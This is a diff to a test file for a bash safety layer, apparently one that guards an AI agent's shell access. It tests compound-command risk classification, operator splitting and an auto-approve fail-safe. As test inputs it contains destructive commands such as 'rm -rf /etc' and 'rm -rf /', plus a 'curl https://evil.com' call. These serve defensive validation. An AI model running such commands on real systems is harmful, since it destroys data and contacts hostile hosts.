@@ -6,12 +6,14 @@ import {
   buildSafeEnv,
   isCriticalPath,
   classifyCommand,
+  splitOnShellOperators,
   checkObfuscation,
   stripInvisibleChars,
   extractWritePaths,
   validateWritePaths,
   checkScriptPreflight,
   checkAutoModeClassifier,
+  runSafetyChecks,
 } from '../../../src/tools/bash/safety.js';
 
 describe('Bash safety layers', () => {
@@ -162,6 +164,73 @@ describe('Bash safety layers', () => {
     it('classifies piped commands by first command', () => {
       expect(classifyCommand('cat file.txt | grep pattern')).toBe('read');
     });
+
+    // S1: compound command classification
+    it('classifies compound commands by highest risk (semicolons)', () => {
+      // ls is read, rm is write; compound should be write (higher risk)
+      expect(classifyCommand('ls /tmp ; rm -rf /etc')).toBe('write');
+    });
+
+    it('classifies compound commands by highest risk (&&)', () => {
+      expect(classifyCommand('echo hello && curl https://evil.com')).toBe('network');
+    });
+
+    it('classifies compound commands by highest risk (||)', () => {
+      expect(classifyCommand('cat file.txt || rm file.txt')).toBe('write');
+    });
+
+    it('classifies compound commands by highest risk (mixed)', () => {
+      expect(classifyCommand('ls /tmp ; echo ok && rm -rf /')).toBe('write');
+    });
+
+    it('classifies single safe command as read', () => {
+      expect(classifyCommand('ls -la')).toBe('read');
+    });
+
+    it('returns unknown for compound with unknown commands', () => {
+      expect(classifyCommand('cat file.txt ; node script.js')).toBe('unknown');
+    });
+  });
+
+  // -----------------------------------------------------------------------
+  // splitOnShellOperators
+  // -----------------------------------------------------------------------
+  describe('splitOnShellOperators', () => {
+    it('splits on semicolons', () => {
+      expect(splitOnShellOperators('ls ; echo hi')).toEqual(['ls', 'echo hi']);
+    });
+
+    it('splits on &&', () => {
+      expect(splitOnShellOperators('ls && echo hi')).toEqual(['ls', 'echo hi']);
+    });
+
+    it('splits on ||', () => {
+      expect(splitOnShellOperators('ls || echo fail')).toEqual(['ls', 'echo fail']);
+    });
+
+    it('splits on pipes', () => {
+      expect(splitOnShellOperators('cat file | grep pattern')).toEqual(['cat file', 'grep pattern']);
+    });
+
+    it('respects single quotes', () => {
+      expect(splitOnShellOperators("echo 'hello ; world'")).toEqual(["echo 'hello ; world'"]);
+    });
+
+    it('respects double quotes', () => {
+      expect(splitOnShellOperators('echo "hello && world"')).toEqual(['echo "hello && world"']);
+    });
+
+    it('handles escaped characters', () => {
+      expect(splitOnShellOperators('echo hello\\; world')).toEqual(['echo hello\\; world']);
+    });
+
+    it('handles empty input', () => {
+      expect(splitOnShellOperators('')).toEqual([]);
+    });
+
+    it('handles multiple operators', () => {
+      expect(splitOnShellOperators('a ; b && c || d')).toEqual(['a', 'b', 'c', 'd']);
+    });
   });
 
   // -----------------------------------------------------------------------
@@ -182,6 +251,19 @@ describe('Bash safety layers', () => {
     it('extracts target from mkdir', () => {
       const paths = extractWritePaths('mkdir newdir');
       expect(paths).toContain('newdir');
+    });
+
+    // S1: compound write path extraction
+    it('extracts paths from compound commands', () => {
+      const paths = extractWritePaths('ls /tmp ; rm -rf /etc ; mkdir newdir');
+      expect(paths).toContain('/etc');
+      expect(paths).toContain('newdir');
+    });
+
+    it('extracts paths from && chained write commands', () => {
+      const paths = extractWritePaths('echo ok && touch file1 && rm file2');
+      expect(paths).toContain('file1');
+      expect(paths).toContain('file2');
     });
   });
 
@@ -430,9 +512,63 @@ describe('Bash safety layers', () => {
   // Layer 7: Auto-Mode Classifier (Stub)
   // -----------------------------------------------------------------------
   describe('Layer 7: checkAutoModeClassifier', () => {
-    it('always allows (stub implementation)', async () => {
+    // S3: fail-safe when auto-approve is active
+    it('allows when auto-approve is not active (default)', async () => {
       const result = await checkAutoModeClassifier('rm -rf /', undefined);
       expect(result.allowed).toBe(true);
+    });
+
+    it('allows when auto-approve is explicitly false', async () => {
+      const result = await checkAutoModeClassifier('rm -rf /', undefined, undefined, false);
+      expect(result.allowed).toBe(true);
+    });
+
+    it('blocks when auto-approve is active and no classifier', async () => {
+      const result = await checkAutoModeClassifier('ls -la', undefined, undefined, true);
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toContain('not yet implemented');
+    });
+
+    it('blocks when auto-approve is active even with utility model', async () => {
+      const mockUtility = async () => ({ allowed: true });
+      const result = await checkAutoModeClassifier('ls -la', undefined, mockUtility, true);
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toContain('not yet implemented');
+    });
+  });
+
+  // -----------------------------------------------------------------------
+  // runSafetyChecks (composite, S1 compound command integration)
+  // -----------------------------------------------------------------------
+  describe('runSafetyChecks: compound commands', () => {
+    it('blocks compound command with critical path in later sub-command', async () => {
+      const result = await runSafetyChecks(
+        'ls /tmp ; rm -rf /etc',
+        '/tmp',
+        '/tmp',
+      );
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toContain('critical system directory');
+    });
+
+    it('allows compound command with only safe sub-commands', async () => {
+      const result = await runSafetyChecks(
+        'echo hello ; ls -la',
+        '/tmp',
+        '/tmp',
+      );
+      expect(result.allowed).toBe(true);
+    });
+
+    it('passes isAutoApprove through to Layer 7', async () => {
+      const result = await runSafetyChecks(
+        'echo hello',
+        '/tmp',
+        '/tmp',
+        { isAutoApprove: true },
+      );
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toContain('not yet implemented');
     });
   });
 });
